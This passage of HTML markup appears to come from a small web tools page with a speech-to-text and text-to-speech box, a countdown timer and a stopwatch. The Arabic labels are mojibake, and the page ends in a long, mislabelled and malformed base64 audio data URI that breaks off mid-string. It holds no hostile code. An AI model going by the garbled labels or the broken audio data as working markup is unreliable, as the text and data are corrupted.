    <h2>ğŸ™ï¸ ØµÙ†Ø¯ÙˆÙ‚ Ø£Ø¯ÙˆØ§Øª Ø§Ù„ÙƒÙ„Ø§Ù… ğŸ—£ï¸</h2>
    <p class="description">Ø§Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ù„Ù„ØªØ­Ø¯Ø« Ø£Ùˆ Ù„Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ø¥Ù„Ù‰ Ø§Ù„Ù†Øµ Ø§Ù„Ù…ÙƒØªÙˆØ¨.</p>
    
    <textarea id="shared-textarea" rows="8" placeholder="ØªØ­Ø¯Ø« Ù„ÙŠØªÙ… ÙƒØªØ§Ø¨Ø© Ø§Ù„Ù†Øµ Ù‡Ù†Ø§ØŒ Ø£Ùˆ Ø§ÙƒØªØ¨ Ù†ØµÙ‹Ø§ Ù„ØªØ³ØªÙ…Ø¹ Ø¥Ù„ÙŠÙ‡..."></textarea>
    
    <div class="main-controls">
        <button id="listen-btn" title="Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ØµÙˆØª">ğŸ¤ Ø§Ø³ØªÙ…Ø¹ Ø§Ù„Ø¢Ù†</button>
        <button id="speak-btn" title="Ù†Ø·Ù‚ Ø§Ù„Ù†Øµ">ğŸ”Š Ø§Ù†Ø·Ù‚ Ø§Ù„Ù†Øµ</button>
    </div>

    <div class="extra-tools">
        <button id="share-btn" title="Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ù†Øµ" disabled>ğŸ”— Ù…Ø´Ø§Ø±ÙƒØ©</button>
        <button id="download-btn" title="ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù†Øµ" disabled>ğŸ’¾ ØªØ­Ù…ÙŠÙ„</button>
    </div>

    <p id="tool-status" class="status"></p>
</div>






    <div class="container">
        <h2>â±ï¸ Ù…Ø¤Ù‚Øª Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ (Timer)</h2>
        <div class="timer-inputs">
            <label><span>Ø³Ø§Ø¹Ø§Øª</span><input type="number" id="hours-input" min="0" max="99" value="0"></label>
            <label><span>Ø¯Ù‚Ø§Ø¦Ù‚</span><input type="number" id="minutes-input" min="0" max="59" value="0"></label>
            <label><span>Ø«ÙˆØ§Ù†ÙŠ</span><input type="number" id="seconds-input" min="0" max="59" value="5"></label>
        </div>
        <div id="countdown-display" class="timer-display">00:00:00</div>
        <div class="buttons">
            <button id="start-timer-btn">Ø¨Ø¯Ø¡</button>
            <button id="pause-timer-btn">Ø¥ÙŠÙ‚Ø§Ù Ù…Ø¤Ù‚Øª</button>
            <button id="cancel-timer-btn">Ø¥Ù„ØºØ§Ø¡</button>
        </div>
    </div>

    <div class="container">
        <h2>â²ï¸ Ø³Ø§Ø¹Ø© Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù (Stopwatch)</h2>
        <div id="stopwatch-display" class="timer-display">00:00:00.000</div>
        <div class="buttons">
            <button id="start-stopwatch-btn">Ø¨Ø¯Ø¡</button>
            <button id="stop-stopwatch-btn">Ø¥ÙŠÙ‚Ø§Ù</button>
            <button id="reset-stopwatch-btn">Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ†</button>
        </div>
    </div>
    
    <audio id="alarm-sound" preload="auto">
        <source src="data:audio/mpeg;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YUIAAABvT1//PyGE9f/6/ff/5/7n/9j/5f/1+AD3APsA+gD4APkA9ADzAPMA8wDzAPEA8ADuAOgA5gDfANMAzwC/AKoAogCRAJAAfgB1AGgAXgBSAEcAPwAuACgAIQAbABQADgAJAAMAAwABAP7/+P7p/eT+3P3Q/cr9x/28/br9t/22/bL9sv2x/bX9uP28/cD9yv3R/dz96P72/vL+8v7v/u3+6f7o/uj+5/7o/un+6v7t/vL+9v77//z//f/9//z//P/8//z//P/8//z//f/8/wD//AD//AD//P/8/wD//AD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8A/wD/AP8